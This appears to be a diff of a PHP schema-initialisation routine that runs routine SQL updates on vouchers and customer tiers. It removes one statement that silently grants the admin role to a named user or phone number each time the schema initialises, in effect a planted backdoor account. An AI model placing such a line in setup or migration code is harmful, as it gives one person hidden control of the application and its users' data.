@@ -270,7 +270,6 @@ function ensureSchemaInitialized(PDO $pdo) {
             "UPDATE `vouchers` SET `max_per_user` = 1 WHERE `code` IN ('WELCOME10', 'SINHVIEN30K') AND (`max_per_user` IS NULL OR `max_per_user` = 0)",
             "UPDATE `vouchers` SET `max_per_user` = 1 WHERE `max_per_user` IS NULL OR `max_per_user` = 0",
             "UPDATE `users` u INNER JOIN `customer_crm` c ON u.phone = c.phone SET u.customer_tier = c.customer_tier WHERE u.customer_tier = 'standard' AND c.customer_tier != 'standard'",
-            "UPDATE `users` SET `role` = 'admin' WHERE `username` = 'vxyen0801' OR `phone` = '0352313548'"
         ];
         foreach ($postUpdates as $pu) {
             try {
